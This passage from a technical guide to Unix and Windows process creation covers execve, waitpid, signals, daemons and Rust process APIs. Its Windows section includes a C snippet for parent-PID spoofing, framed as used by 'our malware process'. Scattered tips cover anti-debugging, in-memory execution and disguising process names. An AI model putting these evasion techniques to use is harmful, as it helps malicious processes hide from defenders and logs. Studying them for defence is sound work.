process image** with a new one. The PID does not change. Think of it as emptying the
process container and filling it with new content.

```
execve("/bin/ls", argv[], envp[])

BEFORE execve():
+------------------------------------------+
| Process PID=1234                         |
| Memory: [/usr/bin/python image]          |
| FDs: 0(stdin) 1(stdout) 2(stderr) 3(sock)|
| Signals: SIGUSR1 -> custom_handler()     |
| PID: 1234, PPID: 1000                    |
+------------------------------------------+
                     |
                     | execve() called
                     v
[KERNEL SIDE]
  1. Open new binary (/bin/ls), load PT_LOAD segments
  2. Create new mm_struct, map new segments
  3. Replace old page table with new one
  4. Set up new stack with argv, envp, aux vectors
  5. Reset signal dispositions to SIG_DFL
  6. Close FDs marked with FD_CLOEXEC
  7. Set RIP = e_entry from ELF header (or ld.so entry if dynamic)
  8. Return to userspace in new image

AFTER execve():
+------------------------------------------+
| Process PID=1234 (SAME PID!)             |
| Memory: [/bin/ls image]                  |
| FDs: 0(stdin) 1(stdout) 2(stderr)        |
|      (fd 3 closed -- had FD_CLOEXEC)     |
| Signals: all reset to SIG_DFL            |
| PID: 1234, PPID: 1000 (unchanged)        |
+------------------------------------------+
```

**What execve() preserves across the exec boundary**:
- PID and PPID
- Parent process group
- Session ID
- Real UID/GID (effective can change if setuid binary)
- Open FDs without `FD_CLOEXEC`
- Environment variables (from envp argument)
- Process priority (nice value)
- CPU affinity (partially)

**What execve() destroys**:
- Entire address space (text, data, BSS, heap, stack all replaced)
- Signal handlers (all reset to SIG_DFL)
- Shared memory segments (detached)
- Memory locks (released)
- Threads (all other threads are killed; only calling thread continues in new image)
- File descriptors with `FD_CLOEXEC` flag

### 8.5 The exec() Family

The `exec()` family in libc wraps `execve()`. Understanding each variant:

```
FUNCTION        ARGS FORMAT           PATH SEARCH    ENV PASSED
execl(p,a...)   list of char*         no             inherits environ
execv(p,av)     array of char*        no             inherits environ
execlp(f,a...)  list of char*         YES (PATH)     inherits environ
execvp(f,av)    array of char*        YES (PATH)     inherits environ
execle(p,a,e)   list + explicit envp  no             explicit envp
execvpe(f,av,e) array + explicit envp YES (PATH)     explicit envp
execve(p,av,e)  array + explicit envp no (syscall)   explicit envp (syscall)

NOTE: execve is the only real syscall.
      All others are libc wrappers that build argv[] and call execve().
```

### 8.6 waitpid() and Child Reaping

When a child exits, the parent must "reap" it by calling `wait()`/`waitpid()` to collect
its exit status. Until reaped, the child remains as a **zombie** (EXIT_ZOMBIE).

```c
pid_t waitpid(pid_t pid, int *wstatus, int options);

// pid argument semantics:
//  pid > 0   : wait for specific child with that PID
//  pid == 0  : wait for any child in same process group
//  pid == -1 : wait for ANY child (most common usage)
//  pid < -1  : wait for any child in process group abs(pid)

// options:
//  WNOHANG    : return immediately if no child has changed state
//  WUNTRACED  : also return if child has been STOPPED (SIGSTOP)
//  WCONTINUED : also return if stopped child was CONTINUED (SIGCONT)
//  WNOWAIT    : peek at state without reaping (child remains waitable)
//  __WALL     : wait for all children regardless of type
//  __WCLONE   : wait only for clone() children

// wstatus macros to decode exit reason:
WIFEXITED(wstatus)    // true if child terminated normally (exit/return)
WEXITSTATUS(wstatus)  // exit code (0-255) if WIFEXITED
WIFSIGNALED(wstatus)  // true if child killed by signal
WTERMSIG(wstatus)     // signal number that killed child if WIFSIGNALED
WCOREDUMP(wstatus)    // true if child produced core dump
WIFSTOPPED(wstatus)   // true if child was stopped (WUNTRACED needed)
WSTOPSIG(wstatus)     // signal that stopped child if WIFSTOPPED
WIFCONTINUED(wstatus) // true if child was continued by SIGCONT
```

### 8.7 exit() vs _exit() vs ExitProcess()

```
exit()          [libc function]
  |
  |-- calls atexit() handlers (in LIFO order)
  |-- flushes stdio buffers (fclose for all open FILE*)
  |-- calls on_exit() handlers
  |-- calls _exit() syscall

_exit()         [thin syscall wrapper]
  |
  |-- does NOT flush stdio buffers
  |-- does NOT call atexit() handlers
  |-- calls exit_group(status) syscall directly
  |-- SAFE to call in child after fork() to avoid
  |   double-flushing parent's buffers!

abort()
  |-- raises SIGABRT
  |-- if not handled: core dump + termination
  |-- used by assert() failure, panic(), etc.

Rule of thumb:
  After fork() + without exec(): call _exit() in child, not exit()
  After exec() fails: call _exit() in child
  Normal program end: exit() or return from main() (which calls exit())
```

### 8.8 Zombie and Orphan Processes

**Zombie Process**:
```
+--------+     exit()      +--------+
| Child  | ------------->  | ZOMBIE |  <- PID still in process table
| PID:2  |                 | PID:2  |     minimal PCB remains
+--------+                 | state: |     no memory, no FDs
                           | EXIT_  |     just exit status stored
                           | ZOMBIE |     shows as 'Z' in ps
                           +--------+
                                |
               parent calls waitpid(2, &status, 0)
                                |
                                v
                           +--------+
                           |  DEAD  | <- PCB freed, PID recycled
                           +--------+

If parent NEVER calls waitpid() and has many children:
-> PID table fills with zombies
-> new fork() calls fail with EAGAIN (no PIDs available)
-> This is a denial-of-service condition

Solution: Install SIGCHLD handler that calls waitpid(-1, NULL, WNOHANG)
          OR explicitly set SIGCHLD to SIG_IGN (auto-reaps on Linux)
```

**Orphan Process**:
```
+--------+    parent dies    +---------+
| Parent | ----------------> | orphan  |
| PID:1  |                   | PID:5   |
| child: |                   | PPID:1  | <- becomes 1 (init/systemd)
|   PID5 |                   +---------+
+--------+

init (PID 1) adopts all orphans automatically.
init periodically calls waitpid() to reap them.

Note: On systems with systemd, orphans may be adopted by the subreaper
(prctl(PR_SET_CHILD_SUBREAPER)) rather than PID 1.
```

### 8.9 Windows: CreateProcess()

Windows does not use fork+exec. It creates processes from scratch in one operation.

```c
BOOL CreateProcessW(
    LPCWSTR  lpApplicationName,    // full path to executable OR NULL
    LPWSTR   lpCommandLine,        // command line string (mutable!)
    LPSECURITY_ATTRIBUTES lpProcessAttributes, // process SA
    LPSECURITY_ATTRIBUTES lpThreadAttributes,  // primary thread SA
    BOOL     bInheritHandles,      // inherit handles?
    DWORD    dwCreationFlags,      // creation flags (see below)
    LPVOID   lpEnvironment,        // environment block (NULL = inherit)
    LPCWSTR  lpCurrentDirectory,   // working directory
    LPSTARTUPINFOW  lpStartupInfo, // startup config (stdin/out/err, window)
    LPPROCESS_INFORMATION lpProcessInformation // OUT: process/thread handles
);
```

**Key Creation Flags**:

| Flag                       | Value      | Effect                                              |
|----------------------------|------------|-----------------------------------------------------|
| CREATE_SUSPENDED           | 0x00000004 | **Primary thread starts suspended** (hollowing!)   |
| CREATE_NEW_CONSOLE         | 0x00000010 | New console window                                  |
| CREATE_NO_WINDOW           | 0x08000000 | No console window (malware stealth)                 |
| DETACHED_PROCESS           | 0x00000008 | No console attachment                               |
| CREATE_NEW_PROCESS_GROUP   | 0x00000200 | New process group (Ctrl+C won't kill it)           |
| DEBUG_PROCESS              | 0x00000001 | Calling process debugs the new process              |
| EXTENDED_STARTUPINFO_PRESENT| 0x00080000 | Use STARTUPINFOEXW (enables PPID spoofing!)        |

**PPID Spoofing** — The `EXTENDED_STARTUPINFO_PRESENT` + `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS`
combination allows a process to specify an **arbitrary parent handle**. The child will appear
to have been created by a different process in Task Manager and event logs:

```c
STARTUPINFOEXA si = {0};
si.StartupInfo.cb = sizeof(si);
InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &size);

// Open "trusted" parent (e.g., explorer.exe, svchost.exe)
HANDLE hFakeParent = OpenProcess(PROCESS_ALL_ACCESS, FALSE, explorer_pid);

UpdateProcThreadAttribute(si.lpAttributeList, 0,
    PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
    &hFakeParent, sizeof(HANDLE), NULL, NULL);

// Child process will show PPID = explorer_pid in event logs
// even though it was created by our malware process
CreateProcessW(..., EXTENDED_STARTUPINFO_PRESENT, ..., &si.StartupInfo, &pi);
```

This is **T1134.004** (Access Token Manipulation: Parent PID Spoofing). Used by
**Cobalt Strike**, **Metasploit**, and many advanced implants.

---

## 9. C Implementation: Complete POSIX API

### 9.1 Basic fork+exec Pattern

```c
#include <unistd.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <string.h>

/*
 * Fork-exec pattern: the canonical Unix process creation idiom.
 * After fork(), parent and child run the same code but fork() returns
 * different values to distinguish them.
 */
pid_t spawn_process(const char *path, char *const argv[], char *const envp[])
{
    pid_t pid = fork();
    if (pid < 0) {
        perror("fork");
        return -1;
    }

    if (pid == 0) {
        /*
         * === CHILD PROCESS ===
         * We are now in the child. The parent's address space was COW-copied.
         * We immediately exec to replace this copy with the target binary.
         *
         * IMPORTANT: Any resource cleanup that should NOT happen twice
         * (like flushing buffers) must be done carefully here.
         * Always use _exit() here, not exit(), to avoid double-flushing
         * the parent's stdio buffers.
         */
        if (execve(path, argv, envp) == -1) {
            /* execve failed — still in child, must exit */
            fprintf(stderr, "[child] execve(%s) failed: %s\n",
                    path, strerror(errno));
            _exit(EXIT_FAILURE);  /* _exit, NOT exit! */
        }
        /* UNREACHABLE: execve replaces our image if successful */
    }

    /* === PARENT PROCESS === */
    /* pid == child's PID */
    return pid;
}

int main(void)
{
    char *argv[] = { "/bin/ls", "-la", "/tmp", NULL };
    char *envp[] = { "HOME=/root", "PATH=/usr/bin:/bin", NULL };

    pid_t child = spawn_process("/bin/ls", argv, envp);
    if (child < 0) return 1;

    int wstatus;
    pid_t waited = waitpid(child, &wstatus, 0); /* block until child changes state */
    if (waited == -1) { perror("waitpid"); return 1; }

    if (WIFEXITED(wstatus)) {
        printf("child exited with code %d\n", WEXITSTATUS(wstatus));
    } else if (WIFSIGNALED(wstatus)) {
        printf("child killed by signal %d (%s)\n",
               WTERMSIG(wstatus), strsignal(WTERMSIG(wstatus)));
        if (WCOREDUMP(wstatus)) printf("  (core dump generated)\n");
    }
    return 0;
}
```

### 9.2 exec() Family — Complete Reference

```c
#include <unistd.h>

/*
 * All exec() variants ultimately call execve().
 * The naming convention:
 *   'l' = list  : args passed as var-arg list, terminated with NULL
 *   'v' = vector: args passed as char *argv[] array
 *   'p' = path  : searches PATH environment variable
 *   'e' = env   : explicit environment passed as char *envp[]
 */

/* execl: path, arg list (NULL terminated), inherits environ */
execl("/bin/ls", "ls", "-la", "/tmp", (char *)NULL);

/* execv: path, argv array, inherits environ */
char *argv[] = { "ls", "-la", "/tmp", NULL };
execv("/bin/ls", argv);

/* execlp: searches PATH, arg list (NULL terminated) */
execlp("ls", "ls", "-la", "/tmp", (char *)NULL);
/*     ^--- "ls" not "/bin/ls": PATH search finds it */

/* execvp: searches PATH, argv array */
char *argv2[] = { "ls", "-la", "/tmp", NULL };
execvp("ls", argv2);

/* execle: explicit env (no PATH search) */
char *envp[] = { "HOME=/root", "PATH=/usr/bin:/bin", NULL };
execle("/bin/ls", "ls", "-la", "/tmp", (char *)NULL, envp);

/* execvpe: searches PATH, argv array, explicit env */
execvpe("ls", argv, envp);

/* execve: the REAL syscall (all others wrap this) */
execve("/bin/ls", argv, envp);

/*
 * execveat: exec relative to directory fd (like openat for exec)
 * Useful for executing binaries from memfds (in-memory execution)
 */
int dirfd = open("/tmp", O_RDONLY | O_DIRECTORY);
execveat(dirfd, "my_binary", argv, envp, 0);
/* Absolute path or "" with AT_EMPTY_PATH flag for memfd */
```

### 9.3 Comprehensive waitpid Usage

```c
#include <sys/wait.h>
#include <stdio.h>

/*
 * Wait for ANY child, non-blocking, print all state changes.
 * This is the pattern used in shell job control implementations.
 */
void reap_children(void)
{
    int wstatus;
    pid_t pid;

    /* WNOHANG: return immediately if no state change */
    /* WUNTRACED: also notify on stop (SIGSTOP, SIGTSTP) */
    /* WCONTINUED: also notify on continue (SIGCONT) */
    while ((pid = waitpid(-1, &wstatus, WNOHANG | WUNTRACED | WCONTINUED)) > 0)
    {
        if (WIFEXITED(wstatus)) {
            printf("[%d] exited: status=%d\n", pid, WEXITSTATUS(wstatus));
        }
        else if (WIFSIGNALED(wstatus)) {
            printf("[%d] killed by signal %d (%s)%s\n",
                   pid, WTERMSIG(wstatus),
                   strsignal(WTERMSIG(wstatus)),
                   WCOREDUMP(wstatus) ? " [core dumped]" : "");
        }
        else if (WIFSTOPPED(wstatus)) {
            printf("[%d] stopped by signal %d (%s)\n",
                   pid, WSTOPSIG(wstatus),
                   strsignal(WSTOPSIG(wstatus)));
            /* Could resume with: kill(pid, SIGCONT); */
        }
        else if (WIFCONTINUED(wstatus)) {
            printf("[%d] continued\n", pid);
        }
    }

    if (pid == -1 && errno != ECHILD) {
        perror("waitpid");
    }
}
```

### 9.4 Signal Handling with sigaction

**Never use `signal()` in production code.** The behavior of `signal()` is
implementation-defined for signal disposition after firing (it may reset to SIG_DFL).
`sigaction()` is the POSIX standard and is deterministic.

```c
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/wait.h>

/* Global flag set by signal handler (must be volatile sig_atomic_t) */
static volatile sig_atomic_t got_sigchld = 0;
static volatile sig_atomic_t got_sigterm = 0;

/*
 * Signal handler: must be async-signal-safe!
 * Do NOT call printf, malloc, free, or non-reentrant functions here.
 * Only async-signal-safe functions: write(), _exit(), kill(), sigprocmask()
 */
static void sigchld_handler(int sig, siginfo_t *info, void *ctx)
{
    (void)sig; (void)ctx;
    /* info->si_pid  = PID of child that changed state */
    /* info->si_uid  = UID of child */
    /* info->si_code = CLD_EXITED, CLD_KILLED, CLD_STOPPED, etc. */
    got_sigchld = 1;

    /* Reap inside handler to prevent zombie accumulation */
    int saved_errno = errno;
    while (waitpid(-1, NULL, WNOHANG) > 0)
        ;  /* reap all available children */
    errno = saved_errno;  /* preserve errno across signal handler */
}

static void sigterm_handler(int sig, siginfo_t *info, void *ctx)
{
    (void)sig; (void)info; (void)ctx;
    got_sigterm = 1;
    /* Cannot do cleanup here safely — just set flag, handle in main loop */
}

void setup_signals(void)
{
    struct sigaction sa;

    /* SA_RESTART: automatically restart interrupted syscalls */
    /* SA_SIGINFO: use 3-arg handler (gets siginfo_t) */
    /* SA_NOCLDSTOP: for SIGCHLD, don't notify on SIGSTOP */

    /* SIGCHLD handler */
    memset(&sa, 0, sizeof(sa));
    sa.sa_sigaction = sigchld_handler;
    sigemptyset(&sa.sa_mask);
    /* Block SIGCHLD during SIGCHLD handler to prevent re-entrancy */
    sigaddset(&sa.sa_mask, SIGCHLD);
    sa.sa_flags = SA_RESTART | SA_SIGINFO;
    if (sigaction(SIGCHLD, &sa, NULL) == -1) {
        perror("sigaction(SIGCHLD)");
        exit(1);
    }

    /* SIGTERM handler */
    memset(&sa, 0, sizeof(sa));
    sa.sa_sigaction = sigterm_handler;
    sigemptyset(&sa.sa_mask);
    sa.sa_flags = SA_RESTART | SA_SIGINFO;
    if (sigaction(SIGTERM, &sa, NULL) == -1) {
        perror("sigaction(SIGTERM)");
        exit(1);
    }

    /* Ignore SIGPIPE (broken pipe) — handle EPIPE errno instead */
    sa.sa_handler = SIG_IGN;
    sigemptyset(&sa.sa_mask);
    sa.sa_flags = 0;
    sigaction(SIGPIPE, &sa, NULL);
}

/*
 * Signal masking: temporarily block signals during critical sections
 */
void critical_section_example(void)
{
    sigset_t block_mask, old_mask;

    sigemptyset(&block_mask);
    sigaddset(&block_mask, SIGCHLD);
    sigaddset(&block_mask, SIGTERM);

    /* Block signals: they queue but won't be delivered */
    sigprocmask(SIG_BLOCK, &block_mask, &old_mask);

    /* === critical section: modifying shared state === */
    /* No signal handler will fire here */

    /* Restore original mask: queued signals may now fire */
    sigprocmask(SIG_SETMASK, &old_mask, NULL);
}
```

### 9.5 Process Groups, Sessions, and Job Control

```c
#include <unistd.h>
#include <sys/types.h>

/*
 * Process group hierarchy:
 *
 *   Session SID=100
 *   |
 *   +-- Process Group PGID=100 (foreground, has controlling terminal)
 *   |   |-- PID=100 (shell, group leader)
 *   |   |-- PID=101 (shell job: "cat file | grep pattern")
 *   |   +-- PID=102
 *   |
 *   +-- Process Group PGID=200 (background job: "long_task &")
 *       |-- PID=200 (background job leader)
 *       +-- PID=201
 *
 * Terminal signals (Ctrl+C = SIGINT, Ctrl+\ = SIGQUIT, Ctrl+Z = SIGTSTP)
 * go to the FOREGROUND process group.
 * Background processes receive SIGTTOU/SIGTTIN if they try to access terminal.
 */

pid_t pid = fork();
if (pid == 0) {
    /* Child: set ourselves as leader of a new process group */
    setpgid(0, 0);   /* setpgid(pid, pgid): 0,0 = self becomes group leader */
    /* Now our PGID == our PID */

    /* Or: create a completely new session (used for daemons) */
    /* setsid() creates new session, new process group, detaches from terminal */
    setsid();
    /* After setsid():
       - New session SID = our PID
       - New PGID = our PID
       - No controlling terminal
       - We are NOT a process group leader prior to this call
         (setsid() fails if we ARE a process group leader — hence double fork)
    */
}

/* Reading process group information */
pid_t my_pid  = getpid();
pid_t my_ppid = getppid();
pid_t my_pgid = getpgid(0);   /* 0 = current process */
pid_t my_sid  = getsid(0);

/* Set process group of specific PID (used by shells to assign jobs) */
setpgid(child_pid, child_pid);   /* child becomes its own group leader */
/* OR: setpgid(child_pid, existing_pgid); add child to existing group */
```

### 9.6 prctl — Process Control Operations

```c
#include <sys/prctl.h>
#include <linux/prctl.h>

/* Set process name (shows in /proc/PID/comm, ps output) */
prctl(PR_SET_NAME, "my_worker", 0, 0, 0);

/* Set death signal: signal sent to this process when its parent dies */
prctl(PR_SET_PDEATHSIG, SIGKILL, 0, 0, 0);

/* Make process non-dumpable (no core dump, ptrace harder) */
prctl(PR_SET_DUMPABLE, 0, 0, 0, 0);

/* Check if we're being traced (ptrace anti-debug) */
int dumpable = prctl(PR_GET_DUMPABLE, 0, 0, 0, 0);
/* If ptrace is attached, dumpable may be 0 */

/* Disable new privilege escalation (no setuid execution after this) */
prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0);

/* Install seccomp BPF filter */
/* prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &prog); */

/* Set child subreaper: orphaned children of our descendants adopt us */
prctl(PR_SET_CHILD_SUBREAPER, 1, 0, 0, 0);
```

### 9.7 Anonymous Pipe with Process Redirection

```c
#include <unistd.h>
#include <stdio.h>
#include <string.h>

/*
 * Create a pipeline: parent writes to child's stdin via pipe.
 *
 *   parent                    child
 *   ------                    -----
 *   write(pipe[1], data)  --> read(pipe[0], buf) = stdin
 */
int create_piped_child(const char *cmd, char *const argv[])
{
    int pipefd[2];  /* pipefd[0] = read end, pipefd[1] = write end */

    if (pipe2(pipefd, O_CLOEXEC) == -1) {  /* O_CLOEXEC: auto-close on exec */
        perror("pipe2");
        return -1;
    }

    pid_t pid = fork();
    if (pid < 0) { perror("fork"); return -1; }

    if (pid == 0) {
        /* Child: redirect stdin from pipe read end */
        close(pipefd[1]);           /* close write end (child doesn't write) */
        dup2(pipefd[0], STDIN_FILENO);  /* pipe read -> stdin */
        close(pipefd[0]);           /* original fd no longer needed */
        execvp(cmd, argv);
        _exit(127);
    }

    /* Parent: write to pipe write end */
    close(pipefd[0]);  /* parent doesn't read */

    /* pipefd[1] is now the write end — parent sends data to child's stdin */
    const char *data = "hello from parent\n";
    write(pipefd[1], data, strlen(data));
    close(pipefd[1]);  /* EOF for child */

    int status;
    waitpid(pid, &status, 0);
    return WEXITSTATUS(status);
}
```

### 9.8 Daemon Creation — Double Fork Technique

```c
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>

/*
 * Double fork daemon technique.
 *
 * The problem: after setsid(), the process is a session leader.
 * A session leader CAN acquire a controlling terminal if it opens
 * a terminal device. To guarantee no controlling terminal ever:
 * fork AGAIN after setsid(). The grandchild is NOT a session leader.
 *
 * Process hierarchy:
 *
 * Original (PID A) -> fork1 -> Child (PID B)
 *                                 |-> setsid() [new session, PID B = SID]
 *                                 |-> fork2 -> Grandchild (PID C) [not session leader!]
 *                                 |-> exit (parent A's waitpid returns)
 *
 * Grandchild PID C:
 *   - orphan (adopted by init/PID 1)
 *   - new session (SID = PID B, but B is dead)
 *   - NOT session leader (cannot acquire controlling terminal)
 *   - no controlling terminal
 *   - PPID = 1 (init)
 */
void daemonize(void)
{
    pid_t pid;

    /* Fork 1: parent exits (returns control to shell/init) */
    pid = fork();
    if (pid < 0) { perror("fork1"); exit(EXIT_FAILURE); }
    if (pid > 0) { exit(EXIT_SUCCESS); }  /* parent exits */

    /* We are now the first child */
    /* Create new session: detach from terminal */
    if (setsid() == -1) { perror("setsid"); exit(EXIT_FAILURE); }

    /* Fork 2: session leader dies, grandchild can never acquire terminal */
    pid = fork();
    if (pid < 0) { perror("fork2"); exit(EXIT_FAILURE); }
    if (pid > 0) { exit(EXIT_SUCCESS); }  /* first child exits */

    /* We are now the daemon grandchild */

    /* Change working directory to / to avoid holding mountpoint */
    if (chdir("/") == -1) { perror("chdir"); exit(EXIT_FAILURE); }

    /* Reset file mode creation mask */
    umask(0);

    /* Close ALL open file descriptors inherited from parent */
    long max_fd = sysconf(_SC_OPEN_MAX);
    for (int fd = 0; fd < max_fd; fd++) {
        close(fd);  /* ignore errors */
    }

    /* Redirect stdin/stdout/stderr to /dev/null */
    int devnull = open("/dev/null", O_RDWR);
    if (devnull == -1) { exit(EXIT_FAILURE); }
    dup2(devnull, STDIN_FILENO);
    dup2(devnull, STDOUT_FILENO);
    dup2(devnull, STDERR_FILENO);
    if (devnull > 2) close(devnull);

    /* === Daemon body begins here === */
    /* Write PID file for management */
    FILE *pidfile = fopen("/run/mydaemon.pid", "w");
    if (pidfile) {
        fprintf(pidfile, "%d\n", getpid());
        fclose(pidfile);
    }

    /* Main daemon loop */
    while (1) {
        /* do daemon work */
        sleep(60);
    }
}
```

---

## 10. Rust Implementation

### 10.1 std::process::Command — Builder Pattern

Rust's `std::process::Command` uses a **builder pattern** and is safe, ergonomic,
and memory-safe. It wraps `execve()` on Unix under the hood via `libc`.

```rust
use std::process::{Command, Stdio, Child};
use std::io::{self, Write, Read};

fn main() -> Result<(), Box<dyn std::error::Error>> {
    // Basic: run command, wait for it, get exit code
    let status = Command::new("/bin/ls")
        .arg("-la")
        .arg("/tmp")
        .status()?;

    println!("exit code: {}", status.code().unwrap_or(-1));
    println!("success: {}", status.success());

    // Capture output: collect stdout and stderr as Vec<u8>
    let output = Command::new("/usr/bin/id")
        .output()?;   // runs and waits, collects ALL output into memory

    println!("stdout: {}", String::from_utf8_lossy(&output.stdout));
    println!("stderr: {}", String::from_utf8_lossy(&output.stderr));
    println!("status: {}", output.status);

    // Spawn (async): get Child handle, then interact
    let mut child: Child = Command::new("/bin/cat")
        .stdin(Stdio::piped())      // child's stdin = pipe we write to
        .stdout(Stdio::piped())     // child's stdout = pipe we read from
        .stderr(Stdio::null())      // child's stderr = /dev/null
        .spawn()?;

    // Write to child's stdin
    {
        let stdin = child.stdin.take().expect("piped stdin");
        // Write in a separate thread to avoid deadlock (stdout fill blocks)
        std::thread::spawn(move || {
            let mut stdin = stdin;
            stdin.write_all(b"hello from Rust\n").ok();
            // stdin dropped here -> EOF sent to child
        });
    }

    // Read child's stdout
    let mut stdout_data = Vec::new();
    if let Some(mut out) = child.stdout.take() {
        out.read_to_end(&mut stdout_data)?;
    }

    // Wait for child to finish, get exit status
    let status = child.wait()?;
    println!("child output: {}", String::from_utf8_lossy(&stdout_data));
    println!("child exited: {}", status);

    Ok(())
}
```

### 10.2 std::process::Command with Environment

```rust
use std::process::Command;
use std::collections::HashMap;

fn spawn_with_env() -> Result<(), Box<dyn std::error::Error>> {
    // Method 1: add to inherited environment
    let status = Command::new("/usr/bin/env")
        .env("MY_VAR", "my_value")           // add/override one var
        .env_remove("HOME")                  // remove a var
        .env_clear()                         // clear ALL env, then:
        .envs([("PATH", "/usr/bin:/bin"),     // set specific vars
               ("HOME", "/root"),
               ("USER", "analyst")])
        .status()?;

    // Method 2: build envp HashMap explicitly
    let env: HashMap<String, String> = [
        ("PATH".into(), "/usr/bin:/bin".into()),
        ("LANG".into(), "C".into()),
    ].into_iter().collect();

    let mut cmd = Command::new("/bin/sh");
    cmd.env_clear();
    cmd.envs(&env);
    cmd.arg("-c");
    cmd.arg("echo $PATH; echo $LANG");
    cmd.status()?;

    Ok(())
}
```

### 10.3 Child Process Management

```rust
use std::process::{Command, Stdio};
use std::time::Duration;
use std::thread;

fn manage_child() -> Result<(), Box<dyn std::error::Error>> {
    let mut child = Command::new("/bin/sleep")
        .arg("300")
        .spawn()?;

    // Get the child's PID
    let child_pid = child.id();
    println!("child PID: {}", child_pid);

    // Check if child has exited (non-blocking)
    match child.try_wait()? {
        Some(status) => println!("already exited: {}", status),
        None => println!("still running"),
    }

    // Kill the child (SIGKILL on Unix, TerminateProcess on Windows)
    child.kill()?;

    // Wait after killing
    let status = child.wait()?;
    println!("killed child status: {}", status);

    // --- Timeout pattern ---
    let mut long_running = Command::new("/bin/sleep")
        .arg("3600")
        .spawn()?;

    let pid = long_running.id();
    let timeout = Duration::from_secs(5);

    let result = thread::scope(|s| {
        let handle = s.spawn(|| {
            thread::sleep(timeout);
        });
        handle.join().ok();
    });

    // After timeout, kill if still running
    match long_running.try_wait()? {
        None => {
            long_running.kill()?;
            long_running.wait()?;
            println!("process timed out and was killed");
        }
        Some(s) => println!("process finished before timeout: {}", s),
    }

    Ok(())
}
```

### 10.4 Unix-Specific Extensions with CommandExt

The `std::os::unix::process::CommandExt` trait provides Unix-only capabilities.
This is where Rust's process control becomes as powerful as C.

```rust
use std::process::Command;
use std::os::unix::process::CommandExt;

fn unix_process_control() {
    let mut cmd = Command::new("/bin/sh");
    cmd.arg("-c").arg("id; ps");

    // Set UID/GID before exec (requires root or appropriate capabilities)
    unsafe {
        cmd.uid(1000);
        cmd.gid(1000);
    }

    // Set argv[0] (process name visible in ps) — different from binary path
    cmd.arg0("legitimate_process_name");

    // Set the process group ID of the child
    cmd.process_group(0);  // 0 = child becomes its own group leader
    // Or: cmd.process_group(existing_pgid);

    // pre_exec: closure that runs in child AFTER fork, BEFORE exec
    // CRITICAL: this closure runs in a forked child. Do NOT:
    //   - panic (uses allocator)
    //   - call into Rust async runtime
    //   - use non-async-signal-safe functions
    // DO: call libc functions directly, manipulate file descriptors
    unsafe {
        cmd.pre_exec(|| {
            // This code runs in child after fork, before exec
            // Example: close specific file descriptors
            libc::close(3);
            libc::close(4);
            // Example: change process name in /proc
            // Example: drop capabilities
            // Example: call prctl()
            Ok(())
        });
    }

    cmd.spawn().expect("failed to spawn");
}
```

### 10.5 nix Crate: Direct POSIX Operations

The `nix` crate exposes POSIX syscalls safely. Essential for advanced process control
and for understanding what the standard library hides.

```toml
# Cargo.toml
[dependencies]
nix = { version = "0.27", features = ["process", "signal", "wait", "unistd"] }
```

```rust
use nix::unistd::{fork, ForkResult, execve, getpid, getppid, setsid, setpgid, Pid};
use nix::sys::wait::{waitpid, WaitStatus, WaitPidFlag};
use nix::sys::signal::{kill, Signal};
use nix::errno::Errno;
use std::ffi::CString;

fn fork_exec_nix() -> Result<(), nix::Error> {
    // fork() returns Result<ForkResult, Errno>
    // ForkResult is an enum: Parent { child: Pid } or Child
    match unsafe { fork() }? {
        ForkResult::Parent { child } => {
            println!("[parent PID={}] child PID = {}", getpid(), child);

            // Wait for child
            loop {
                match waitpid(child, Some(WaitPidFlag::WUNTRACED | WaitPidFlag::WCONTINUED))? {
                    WaitStatus::Exited(pid, code) => {
                        println!("[parent] child {} exited with {}", pid, code);
                        break;
                    }
                    WaitStatus::Signaled(pid, sig, coredump) => {
                        println!("[parent] child {} killed by {:?} (core: {})",
                                 pid, sig, coredump);
                        break;
                    }
                    WaitStatus::Stopped(pid, sig) => {
                        println!("[parent] child {} stopped by {:?}", pid, sig);
                        // Resume it
                        kill(pid, Signal::SIGCONT)?;
                    }
                    WaitStatus::Continued(pid) => {
                        println!("[parent] child {} continued", pid);
                    }
                    _ => {}
                }
            }
        }
        ForkResult::Child => {
            // We are in the child process
            println!("[child PID={}] parent PID = {}", getpid(), getppid());

            // Build execve arguments as CString (null-terminated)
            let path = CString::new("/bin/ls").unwrap();
            let argv: Vec<CString> = vec![
                CString::new("ls").unwrap(),
                CString::new("-la").unwrap(),
                CString::new("/tmp").unwrap(),
            ];
            let envp: Vec<CString> = vec![
                CString::new("PATH=/usr/bin:/bin").unwrap(),
                CString::new("HOME=/root").unwrap(),
            ];

            // execve takes slices of &CStr
            execve(
                path.as_ref(),
                &argv.iter().map(|s| s.as_ref()).collect::<Vec<_>>(),
                &envp.iter().map(|s| s.as_ref()).collect::<Vec<_>>(),
            )?;
            // If execve returns, it failed — process must exit
            // unreachable in normal case
        }
    }
    Ok(())
}

// Send signal to a process
fn signal_process(pid: i32, sig: Signal) -> Result<(), nix::Error> {
    kill(Pid::from_raw(pid), sig)
}
```

### 10.6 Signal Handling in Rust

Standard library signal handling is intentionally limited for safety reasons
(Rust's guarantees conflict with async-signal-safety). Use `signal-hook` for robust
signal handling or `nix::sys::signal::sigaction` for direct control.

```toml
[dependencies]
signal-hook = "0.3"
signal-hook-iterator = "0.2"
```

```rust
use signal_hook::consts::{SIGTERM, SIGINT, SIGCHLD, SIGUSR1};
use signal_hook::iterator::Signals;
use std::thread;

fn signal_handling_example() {
    // Method 1: signal-hook iterator (thread-based)
    let mut signals = Signals::new([SIGTERM, SIGINT, SIGCHLD, SIGUSR1])
        .expect("failed to register signals");

    thread::spawn(move || {
        for sig in &mut signals {
            match sig {
                SIGTERM => {
                    println!("SIGTERM received — initiating graceful shutdown");
                    std::process::exit(0);
                }
                SIGINT => {
                    println!("SIGINT (Ctrl+C) received");
                }
                SIGCHLD => {
                    println!("SIGCHLD: a child changed state");
                    // Call waitpid(-1, WNOHANG) via nix here
                }
                SIGUSR1 => {
                    println!("SIGUSR1: user-defined signal");
                }
                _ => unreachable!(),
            }
        }
    });
}

// Method 2: Low-level sigaction via nix (direct control)
